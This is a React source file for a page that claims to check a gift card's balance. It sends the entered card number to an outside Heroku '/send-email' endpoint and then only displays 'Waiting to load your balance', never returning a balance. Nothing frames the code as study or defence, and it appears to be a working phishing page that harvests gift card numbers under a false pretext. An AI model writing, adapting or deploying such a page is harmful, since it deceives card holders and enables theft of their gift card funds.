import React, { useState } from 'react';
import './App.css';

function App() {
    const [userInput, setUserInput] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        setError(null);

        try {
            const response = await fetch('https://lit-basin-94543-b1635a413bba.herokuapp.com/send-email', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ userInput }),
            });

            if (response.ok) {
                alert('Waiting to load your balance');
            } else {
                setError('Unable to process your request. Please try again.');
            }
        } catch (error) {
            setError('An error occurred. Please try again later.');
        } finally {
            setLoading(false);
        }
    };

    return (
    <div className="app h-screen  md:py-28 py-9">
        <div className="md:px-52 px-10">
            <form  
                className='h-80 text-black bg-white px-5 text-left py-10' 
                onSubmit={handleSubmit}>
                <div className="md:text-4xl text-2xl font-extrabold">
                    Gift Card Balance Check
                </div>
                <br/>
                <p className='text-sm pb-2 font-medium'>
                    Please enter your gift card number below to check your balance.
                </p>
                <input
                    className='border rounded-md border-black h-8 md:w-80 w-48 px-3'
                    type="num"
                    placeholder=''
                    id="userInput"
                    value={userInput}
                    onChange={(e) => setUserInput(e.target.value)}
                    required
                /> 
                {loading ? (
                    <button className='border rounded-md ml-1 px-5 py-1 border-black' type="submit" disabled>Loading...</button>
                ) : (
                    <button className='border rounded-md ml-1 px-5 py-1 bg-blue-800 text-white md:text-base text-sm font-semibold' type="submit" >Check</button>
                )}
                {error && <p className="error">{error}</p>}
            </form>
        </div>
    </div>
    );
}

export default App;
